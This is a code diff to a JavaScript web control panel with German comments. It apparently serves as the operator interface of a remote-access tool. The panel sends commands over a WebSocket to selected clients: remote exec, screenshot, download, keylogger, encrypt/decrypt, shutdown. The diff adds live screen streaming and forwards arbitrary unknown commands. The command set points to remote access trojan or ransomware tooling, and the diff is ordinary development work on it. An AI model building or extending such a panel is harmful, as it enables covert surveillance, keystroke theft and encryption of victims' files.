@@ -550,6 +550,7 @@
       if (customPayload) {
         payload = { target_id: String(selectedClientId), ...customPayload };
       } else {
+        // /screenstream_start und /screenstream_stop UI-Handling
         if (commandText.startsWith("/screenstream_start")) handleLiveScreenCommand("/screenstream_start");
         if (commandText.startsWith("/screenstream_stop")) handleLiveScreenCommand("/screenstream_stop");
         let slashPayload = parseSlashCommand(commandText);
@@ -597,21 +598,20 @@
             case "systeminfo":
             case "shutdown":
             case "restart":
+            case "screenstream_start":
+            case "screenstream_stop":
+            case "help":
               break;
             default:
-              log(
-                "Unbekannter Befehl. Verfügbar: exec, screenshot, download, history, keylogger, ls, cd, encrypt, decrypt, systeminfo, shutdown, restart",
-                "error"
-              );
-              debugLog("Unbekannter Befehl: " + action, "warn");
-              return;
+              // Unbekannter Befehl: trotzdem senden
+              payload.argument = argument;
           }
         }
       }
       ws.send(JSON.stringify(payload));
       log(
         `Befehl gesendet: ${payload.action || "(unbekannt)"}${
-          payload.command ? " " + payload.command : payload.path ? " " + payload.path : ""
+          payload.command ? " " + payload.command : payload.path ? " " + payload.path : payload.argument ? " " + payload.argument : ""
         }`,
         "cmd"
       );
@@ -721,7 +721,22 @@
       }
     });
 
-    // --- parseSlashCommand anpassen für encrypt/decrypt ---
+    // --- Live-Screen-Kommandos: UI-Statusanzeige und Bereich ein-/ausblenden ---
+    function handleLiveScreenCommand(cmd) {
+      if (!liveScreenArea) return;
+      if (cmd === "/screenstream_start" || cmd === "screenstream_start") {
+        liveScreenArea.style.display = "";
+        if (screenStatus) screenStatus.textContent = "Live-Bild wird gestartet...";
+      } else if (cmd === "/screenstream_stop" || cmd === "screenstream_stop") {
+        liveScreenArea.style.display = "none";
+        if (screenCanvas && screenCanvas.getContext) {
+          screenCanvas.getContext('2d').clearRect(0, 0, screenCanvas.width, screenCanvas.height);
+        }
+        if (screenStatus) screenStatus.textContent = "";
+      }
+    }
+
+    // --- parseSlashCommand: robust für alle /-Befehle ---
     function parseSlashCommand(cmdText) {
       if (!cmdText.startsWith("/")) return null;
       const [slash, ...args] = cmdText.trim().split(" ");
@@ -755,11 +770,11 @@
         case "restart":
         case "screenstream_start":
         case "screenstream_stop":
-          return { action };
         case "help":
           return { action };
         default:
-          return { action };
+          // Unbekannter /-Befehl wird als action gesendet
+          return { action, argument };
       }
     }
 
